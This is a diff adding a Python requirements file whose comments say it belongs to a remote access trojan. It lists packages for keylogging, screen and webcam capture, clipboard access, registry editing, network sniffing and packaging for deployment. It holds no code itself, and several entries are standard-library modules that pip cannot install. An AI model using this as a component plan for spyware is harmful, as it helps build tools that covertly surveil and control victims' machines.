@@ -1,0 +1,37 @@
+# GUI-related libraries
+tkinter
+customtkinter
+
+# Networking and sockets
+socket
+threading
+
+# File handling and OS interactions
+os
+shutil
+
+# Keylogging
+pynput
+
+# Screen and webcam capture
+pillow
+opencv-python
+
+# System information
+psutil
+pygetwindow
+pyautogui
+pyperclip
+
+# Registry editing (for Windows)
+winreg; sys_platform == 'win32'
+
+# Geolocation and networking
+requests
+scapy
+
+# Sound control
+pydub
+
+# Packaging the RAT for deployment
+pyinstaller
